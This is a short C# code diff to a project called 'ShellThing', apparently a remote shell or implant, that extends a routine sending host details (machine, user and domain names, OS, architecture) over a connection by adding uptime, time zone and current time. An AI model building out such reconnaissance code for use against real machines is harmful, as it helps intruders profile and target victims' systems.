@@ -1,5 +1,6 @@
 using System;
 using System.Collections.Generic;
+using System.Management;
 using System.Linq;
 using System.Text;
 
@@ -17,9 +18,11 @@ namespace ShellThing
             connection.SendData($"MachineName: {Environment.MachineName}\n");
             connection.SendData($"OSVersion: {Environment.OSVersion}\n");
             connection.SendData($"dotNETVersion: {Environment.Version}\n");
+            //Hotfixes are the last thing to be added. 
             connection.SendData($"UserName: {Environment.UserName}\n");
             connection.SendData($"DomainName: {Environment.UserDomainName}\n");
-
+            connection.SendData($"TimeSinceBoot: {TimeSpan.FromMilliseconds(Environment.TickCount)}\n");
+            //The Is64BitOperatingSystem only returns true or false. 
             if (Environment.Is64BitOperatingSystem)
             {
                 connection.SendData($"Architecture: x64\n");
@@ -28,6 +31,7 @@ namespace ShellThing
             {
                 connection.SendData($"Archtecture: x86\n");
             }
+            connection.SendData($"Time zone: {(TimeZoneInfo.Local.IsDaylightSavingTime(DateTime.Now) ? TimeZoneInfo.Local.DaylightName : TimeZoneInfo.Local.StandardName)}\nCurrent Time: {DateTime.Now}\n");
         }
 
         public Dictionary<string, string> Help(bool includeSyntax)
